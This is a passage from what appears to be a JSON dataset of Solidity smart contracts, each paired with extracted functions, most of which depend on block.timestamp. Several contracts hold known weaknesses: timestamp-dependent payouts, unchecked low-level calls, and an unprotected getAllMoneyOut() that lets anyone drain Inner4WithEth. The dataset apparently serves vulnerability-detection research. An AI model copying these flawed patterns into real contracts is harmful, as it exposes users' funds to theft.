keccak256(abi.encodePacked(nonce, fee, to, value, data, delegator)),\n v,\n r,\n s\n );\n Account storage signerAccount = accounts[signer];\n require(\n nonce == signerAccount.nonce &&\n (delegator == address(0) || delegator == msg.sender)\n );\n emit IncreaseNonce(signer, signerAccount.nonce += 1);\n signerAccount.balance = signerAccount.balance.sub(value.add(fee));\n accounts[to].balance += value;\n emit Transfer(signer, to, value);\n accounts[msg.sender].balance += fee;\n emit Transfer(signer, msg.sender, fee);\n if (!to.isAccount()) {\n require(data.length >= 68);\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), signer)\n }\n require(to.call(data));\n }\n return true;\n }\n function directDebit(address debtor, address receiver) public view returns (DirectDebit) {\n return accounts[debtor].instruments[receiver].directDebit;\n }\n function setupDirectDebit(\n address receiver,\n DirectDebitInfo info\n )\n public\n returns (bool)\n {\n accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({\n info: info,\n epoch: 0\n });\n emit SetupDirectDebit(msg.sender, receiver, info);\n return true;\n }\n function terminateDirectDebit(address receiver) public returns (bool) {\n delete accounts[msg.sender].instruments[receiver].directDebit;\n emit TerminateDirectDebit(msg.sender, receiver);\n return true;\n }\n function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n debtorAccount.balance = debtorAccount.balance.sub(amount);\n accounts[msg.sender].balance += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n return true;\n }\n function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\n Account storage receiverAccount = accounts[msg.sender];\n result = true;\n uint256 total;\n for (uint256 i = 0; i < debtors.length; i++) {\n address debtor = debtors[i];\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n uint256 debtorBalance = debtorAccount.balance;\n if (amount > debtorBalance) {\n if (strict) {\n revert();\n }\n result = false;\n emit WithdrawDirectDebitFailure(debtor, msg.sender);\n } else {\n debtorAccount.balance = debtorBalance - amount;\n total += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n }\n }\n receiverAccount.balance += total;\n }\n}\ncontract SmartToken is Authorizable, IssuerContract, ERC20Like {\n string public name;\n string public symbol;\n uint256 public totalSupply;\n uint8 public constant decimals = 18;\n constructor(\n address _issuer,\n FsTKAuthority _fstkAuthority,\n string _name,\n string _symbol,\n uint256 _totalSupply,\n string _metadata\n )\n Authorizable(_fstkAuthority)\n IssuerContract(_issuer)\n ERC20Like(_metadata)\n public\n {\n name = _name;\n symbol = _symbol;\n totalSupply = _totalSupply;\n accounts[_issuer].balance = _totalSupply;\n emit Transfer(address(0), _issuer, _totalSupply);\n }\n function setERC20ApproveChecking(bool approveChecking) public onlyIssuer {\n super.setERC20ApproveChecking(approveChecking);\n }\n function setDelegate(bool delegate) public onlyIssuer {\n super.setDelegate(delegate);\n }\n function setDirectDebit(bool directDebit) public onlyIssuer {\n super.setDirectDebit(directDebit);\n }\n function setMetadata(\n string infoUrl,\n uint256 approveTime,\n bytes approveToken\n )\n public\n onlyIssuer\n onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, infoUrl)), approveTime, approveToken)\n {\n setMetadata0(infoUrl);\n }\n function setLiquid(\n bool liquidity,\n uint256 approveTime,\n bytes approveToken\n )\n public\n onlyIssuer\n onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, liquidity)), approveTime, approveToken)\n {\n setLiquid0(liquidity);\n }\n}",
  "extract_feature": [
    "function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\ndebtorAccount.balance = debtorAccount.balance.sub(amount);\naccounts[msg.sender].balance += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\nreturn true;\n}",
    "function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\nAccount storage receiverAccount = accounts[msg.sender];\nresult = true;\nuint256 total;\nfor (uint256 i = 0; i < debtors.length; i++) {\naddress debtor = debtors[i];\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\nuint256 debtorBalance = debtorAccount.balance;\nif (amount > debtorBalance) {\nif (strict) {\nrevert();\n}\nresult = false;\nemit WithdrawDirectDebitFailure(debtor, msg.sender);\n} else {\ndebtorAccount.balance = debtorBalance - amount;\ntotal += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\n}\n}\nreceiverAccount.balance += total;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4b"
  },
  "filename": "7891.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MATOU is StandardToken {\n string public name = \"MATOU Token\";\n string public symbol = \"MTB\";\n uint8 public decimals = 18;\n uint256 public constant INITIAL_SUPPLY = 1000000000;\n event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);\n function MATOU() public {\n totalSupply_ = INITIAL_SUPPLY * (10 ** uint256(decimals));\n balances[msg.sender] = totalSupply_;\n }\n function burn(uint256 _burntAmount) public returns (bool success) {\n require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\n balances[msg.sender] = balances[msg.sender].sub(_burntAmount);\n totalSupply_ = totalSupply_.sub(_burntAmount);\n emit Transfer(address(this), 0x0, _burntAmount);\n emit Burn(msg.sender, _burntAmount, block.timestamp);\n return true;\n }\n}",
  "extract_feature": [
    "function burn(uint256 _burntAmount) public returns (bool success) {\nrequire(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\nbalances[msg.sender] = balances[msg.sender].sub(_burntAmount);\ntotalSupply_ = totalSupply_.sub(_burntAmount);\nemit Transfer(address(this), 0x0, _burntAmount);\nemit Burn(msg.sender, _burntAmount, block.timestamp);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4c"
  },
  "filename": "8025.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract TokenCHK {\n function balanceOf(address _owner) public pure returns (uint256 balance) {}\n}\ncontract ESSENTIA_PE is Ownable {\n using SafeMath for uint256;\n string public name = \"ESSENTIA Public Engagement\";\n uint256 public tokenPrice = 0;\n uint256 public maxCap = 0;\n address public FWDaddrETH;\n address public ESSgenesis;\n uint256 public totalSold;\n uint256 public decimals = 18;\n mapping (address => uint256) public sold;\n uint256 public pubEnd = 0;\n address contractAddr=this;\n uint256 public tokenUnit = uint256(10)**decimals;\n constructor\n (\n address toETHaddr,\n address addrESSgenesis\n ) public {\n FWDaddrETH = toETHaddr;\n ESSgenesis = addrESSgenesis;\n }\n function () public payable {\n buy();\n }\n function setFWDaddrETH(address _value) public onlyOwner {\n FWDaddrETH = _value;\n }\n function setGenesis(address _value) public onlyOwner {\n ESSgenesis = _value;\n }\n function setMaxCap(uint256 _value) public onlyOwner {\n maxCap = _value;\n }\n function setPrice(uint256 _value) public onlyOwner {\n tokenPrice = _value;\n }\n function setPubEnd(uint256 _value) public onlyOwner {\n pubEnd = _value;\n }\n function buy() public payable {\n require(block.timestamp < pubEnd);\n require(msg.value > 0);\n require(msg.value <= msg.sender.balance + msg.value);\n require(msg.value + totalSold <= maxCap);\n uint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\n require(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\n transferBuy(msg.sender, tokenAmount);\n totalSold = totalSold.add(msg.value);\n FWDaddrETH.transfer(msg.value);\n }\n function withdrawPUB() public returns(bool){\n require(block.timestamp > pubEnd);\n require(sold[msg.sender] > 0);\n if(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\n delete sold[msg.sender];\n return true;\n }\n function transferBuy(address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n sold[_to]=sold[_to].add(_value);\n return true;\n }\n function EMGwithdraw(uint256 weiValue) external onlyOwner {\n require(block.timestamp > pubEnd);\n require(weiValue > 0);\n FWDaddrETH.transfer(weiValue);\n }\n}",
  "extract_feature": [
    "function buy() public payable {\nrequire(block.timestamp < pubEnd);\nrequire(msg.value > 0);\nrequire(msg.value <= msg.sender.balance + msg.value);\nrequire(msg.value + totalSold <= maxCap);\nuint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;\nrequire(tokenAmount<=TokenCHK(ESSgenesis).balanceOf(contractAddr));\ntransferBuy(msg.sender, tokenAmount);\ntotalSold = totalSold.add(msg.value);\nFWDaddrETH.transfer(msg.value);\n}",
    "function withdrawPUB() public returns(bool){\nrequire(block.timestamp > pubEnd);\nrequire(sold[msg.sender] > 0);\nif(!ESSgenesis.call(bytes4(keccak256(\"transfer(address,uint256)\")), msg.sender, sold[msg.sender])){revert();}\ndelete sold[msg.sender];\nreturn true;\n}",
    "function EMGwithdraw(uint256 weiValue) external onlyOwner {\nrequire(block.timestamp > pubEnd);\nrequire(weiValue > 0);\nFWDaddrETH.transfer(weiValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4d"
  },
  "filename": "8099.sol",
  "content": "pragma solidity 0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract tipbotreg {\n uint256 public stakeCommence;\n uint256 public stakeMinAge;\n uint256 public stakeMaxAge;\n function mint() public returns (bool);\n function coinAge() public payable returns (uint256);\n function annualInterest() public view returns (uint256);\n event Mint(address indexed _address, uint _reward);\n}\ncontract tipbot is ERC20,tipbotreg,Ownable {\n using SafeMath for uint256;\n string public name = \"tipbot\";\n string public symbol = \"TIP\";\n uint public decimals = 18;\n uint public stakeCommence;\n uint public stakeMinAge = 3 days;\n uint public stakeMaxAge = 90 days;\n uint public maxMintPoS = 10**17;\n uint public chainStartTime;\n uint public chainStartBlock;\n uint public totalSupply;\n uint public maxTIPSupply;\n uint public initialTIPsupply;\n struct transferInStruct{\n uint256 amount;\n uint64 time;\n }\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n mapping(address => transferInStruct[]) transferIns;\n event Burn(address indexed burner, uint256 value);\n modifier onlyPayloadSize(uint size) {\n require(msg.data.length >= size + 4);\n _;\n }\n modifier canTIPMint() {\n require(totalSupply < maxTIPSupply);\n _;\n }\n function tipbot() public {\n initialTIPsupply = 104000000000000000000000000000;\n maxTIPSupply = 375000000000000000000000000000;\n chainStartTime = block.timestamp;\n chainStartBlock = block.number;\n balances[msg.sender] = initialTIPsupply;\n totalSupply = initialTIPsupply;\n }\n function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) returns (bool) {\n if(msg.sender == _to) return mint();\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\n uint64 _now = uint64(block.timestamp);\n transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));\n transferIns[_to].push(transferInStruct(uint256(_value),_now));\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n emit Transfer(_from, _to, _value);\n if(transferIns[_from].length > 0) delete transferIns[_from];\n uint64 _now = uint64(block.timestamp);\n transferIns[_from].push(transferInStruct(uint256(balances[_from]),_now));\n transferIns[_to].push(transferInStruct(uint256(_value),_now));\n return true;\n }\n function ownerSetStakeCommence(uint timestamp) public onlyOwner {\n require((stakeCommence <= 0) && (timestamp >= chainStartTime));\n stakeCommence = timestamp;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function mint() public canTIPMint returns (bool) {\n if(balances[msg.sender] <= 0) return false;\n if(transferIns[msg.sender].length <= 0) return false;\n uint reward = getPoSReward(msg.sender);\n if(reward <= 0) return false;\n totalSupply = totalSupply.add(reward);\n balances[msg.sender] = balances[msg.sender].add(reward);\n delete transferIns[msg.sender];\n transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));\n emit Mint(msg.sender, reward);\n return true;\n }\n function getBlockNumber() public view returns (uint blockNumber) {\n blockNumber = block.number.sub(chainStartBlock);\n }\n function coinAge() public payable returns (uint myCoinAge) {\n myCoinAge = getCoinAge(msg.sender,block.timestamp);\n }\n function annualInterest() public view returns(uint interest) {\n uint _now = block.timestamp;\n interest = maxMintPoS;\n if((_now.sub(stakeCommence)).div(365 days) == 0) {\n interest = (770 * maxMintPoS).div(100);\n } else if((_now.sub(stakeCommence)).div(365 days) == 1){\n interest = (435 * maxMintPoS).div(100);\n }\n }\n function getPoSReward(address _address) internal view returns (uint) {\n require( (block.timestamp >= stakeCommence) && (stakeCommence > 0) );\n uint _now = block.timestamp;\n uint _coinAge = getCoinAge(_address, _now);\n if(_coinAge <= 0) return 0;\n uint interest = maxMintPoS;\n if((_now.sub(stakeCommence)).div(365 days) == 0) {\n interest = (770 * maxMintPoS).div(100);\n } else if((_now.sub(stakeCommence)).div(365 days) == 1){\n interest = (435 * maxMintPoS).div(100);\n }\n return (_coinAge * interest).div(365 * (10**decimals));\n }\n function getCoinAge(address _address, uint _now) internal view returns (uint _coinAge) {\n if(transferIns[_address].length <= 0) return 0;\n for (uint i = 0; i < transferIns[_address].length; i++){\n if( _now < uint(transferIns[_address][i].time).add(stakeMinAge) ) continue;\n uint nCoinSeconds = _now.sub(uint(transferIns[_address][i].time));\n if( nCoinSeconds > stakeMaxAge ) nCoinSeconds = stakeMaxAge;\n _coinAge = _coinAge.add(uint(transferIns[_address][i].amount) * nCoinSeconds.div(1 days));\n }\n }\n function batchTransfer(address[] _recipients, uint[] _values) public onlyOwner returns (bool) {\n require( _recipients.length > 0 && _recipients.length == _values.length);\n uint total = 0;\n for(uint i = 0; i < _values.length; i++){\n total = total.add(_values[i]);\n }\n require(total <= balances[msg.sender]);\n uint64 _now = uint64(block.timestamp);\n for(uint j = 0; j < _recipients.length; j++){\n balances[_recipients[j]] = balances[_recipients[j]].add(_values[j]);\n transferIns[_recipients[j]].push(transferInStruct(uint256(_values[j]),_now));\n emit Transfer(msg.sender, _recipients[j], _values[j]);\n }\n balances[msg.sender] = balances[msg.sender].sub(total);\n if(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\n if(balances[msg.sender] > 0) transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));\n return true;\n }\n function TokenBurn(uint _value) public onlyOwner {\n require(_value > 0);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n delete transferIns[msg.sender];\n transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));\n totalSupply = totalSupply.sub(_value);\n initialTIPsupply = initialTIPsupply.sub(_value);\n maxTIPSupply = maxTIPSupply.sub(_value*10);\n emit Burn(msg.sender, _value);\n }\n}",
  "extract_feature": [
    "function tipbot() public {\ninitialTIPsupply = 104000000000000000000000000000;\nmaxTIPSupply = 375000000000000000000000000000;\nchainStartTime = block.timestamp;\nchainStartBlock = block.number;\nbalances[msg.sender] = initialTIPsupply;\ntotalSupply = initialTIPsupply;\n}",
    "function transfer(address _to, uint256 _value) public onlyPayloadSize(2 * 32) returns (bool) {\nif(msg.sender == _to) return mint();\nbalances[msg.sender] = balances[msg.sender].sub(_value);\nbalances[_to] = balances[_to].add(_value);\nemit Transfer(msg.sender, _to, _value);\nif(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\nuint64 _now = uint64(block.timestamp);\ntransferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));\ntransferIns[_to].push(transferInStruct(uint256(_value),_now));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3 * 32) returns (bool) {\nrequire(_to != address(0));\nuint256 _allowance = allowed[_from][msg.sender];\nbalances[_from] = balances[_from].sub(_value);\nbalances[_to] = balances[_to].add(_value);\nallowed[_from][msg.sender] = _allowance.sub(_value);\nemit Transfer(_from, _to, _value);\nif(transferIns[_from].length > 0) delete transferIns[_from];\nuint64 _now = uint64(block.timestamp);\ntransferIns[_from].push(transferInStruct(uint256(balances[_from]),_now));\ntransferIns[_to].push(transferInStruct(uint256(_value),_now));\nreturn true;\n}",
    "function mint() public canTIPMint returns (bool) {\nif(balances[msg.sender] <= 0) return false;\nif(transferIns[msg.sender].length <= 0) return false;\nuint reward = getPoSReward(msg.sender);\nif(reward <= 0) return false;\ntotalSupply = totalSupply.add(reward);\nbalances[msg.sender] = balances[msg.sender].add(reward);\ndelete transferIns[msg.sender];\ntransferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));\nemit Mint(msg.sender, reward);\nreturn true;\n}",
    "function getBlockNumber() public view returns (uint blockNumber) {\nblockNumber = block.number.sub(chainStartBlock);\n}",
    "function coinAge() public payable returns (uint myCoinAge) {\nmyCoinAge = getCoinAge(msg.sender,block.timestamp);\n}",
    "function annualInterest() public view returns(uint interest) {\nuint _now = block.timestamp;\ninterest = maxMintPoS;\nif((_now.sub(stakeCommence)).div(365 days) == 0) {\ninterest = (770 * maxMintPoS).div(100);\n} else if((_now.sub(stakeCommence)).div(365 days) == 1){\ninterest = (435 * maxMintPoS).div(100);\n}\n}",
    "function getPoSReward(address _address) internal view returns (uint) {\nrequire( (block.timestamp >= stakeCommence) && (stakeCommence > 0) );\nuint _now = block.timestamp;\nuint _coinAge = getCoinAge(_address, _now);\nif(_coinAge <= 0) return 0;\nuint interest = maxMintPoS;\nif((_now.sub(stakeCommence)).div(365 days) == 0) {\ninterest = (770 * maxMintPoS).div(100);\n} else if((_now.sub(stakeCommence)).div(365 days) == 1){\ninterest = (435 * maxMintPoS).div(100);\n}\nreturn (_coinAge * interest).div(365 * (10**decimals));\n}",
    "function batchTransfer(address[] _recipients, uint[] _values) public onlyOwner returns (bool) {\nrequire( _recipients.length > 0 && _recipients.length == _values.length);\nuint total = 0;\nfor(uint i = 0; i < _values.length; i++){\ntotal = total.add(_values[i]);\n}\nrequire(total <= balances[msg.sender]);\nuint64 _now = uint64(block.timestamp);\nfor(uint j = 0; j < _recipients.length; j++){\nbalances[_recipients[j]] = balances[_recipients[j]].add(_values[j]);\ntransferIns[_recipients[j]].push(transferInStruct(uint256(_values[j]),_now));\nemit Transfer(msg.sender, _recipients[j], _values[j]);\n}\nbalances[msg.sender] = balances[msg.sender].sub(total);\nif(transferIns[msg.sender].length > 0) delete transferIns[msg.sender];\nif(balances[msg.sender] > 0) transferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),_now));\nreturn true;\n}",
    "function TokenBurn(uint _value) public onlyOwner {\nrequire(_value > 0);\nbalances[msg.sender] = balances[msg.sender].sub(_value);\ndelete transferIns[msg.sender];\ntransferIns[msg.sender].push(transferInStruct(uint256(balances[msg.sender]),uint64(block.timestamp)));\ntotalSupply = totalSupply.sub(_value);\ninitialTIPsupply = initialTIPsupply.sub(_value);\nmaxTIPSupply = maxTIPSupply.sub(_value*10);\nemit Burn(msg.sender, _value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4e"
  },
  "filename": "8141.sol",
  "content": "pragma solidity ^0.4.24;\ncontract OuterWithEth {\n Inner1WithEth public myInner1 = new Inner1WithEth();\n function callSomeFunctionViaOuter() public payable {\n myInner1.callSomeFunctionViaInner1.value(msg.value)();\n }\n}\ncontract Inner1WithEth {\n Inner2WithEth public myInner2 = new Inner2WithEth();\n function callSomeFunctionViaInner1() public payable{\n myInner2.callSomeFunctionViaInner2.value(msg.value)();\n }\n}\ncontract Inner2WithEth {\n Inner3WithEth public myInner3 = new Inner3WithEth();\n function callSomeFunctionViaInner2() public payable{\n myInner3.callSomeFunctionViaInner3.value(msg.value)();\n }\n}\ncontract Inner3WithEth {\n Inner4WithEth public myInner4 = new Inner4WithEth();\n function callSomeFunctionViaInner3() public payable{\n myInner4.doSomething.value(msg.value)();\n }\n}\ncontract Inner4WithEth {\n uint256 someValue;\n event SetValue(uint256 val);\n function doSomething() public payable {\n someValue = block.timestamp;\n emit SetValue(someValue);\n }\n function getAllMoneyOut() public {\n msg.sender.transfer(this.balance);\n }\n}",
  "extract_feature": [
    "function doSomething() public payable {\nsomeValue = block.timestamp;\nemit SetValue(someValue);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f4f"
  },
  "filename": "8233.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is 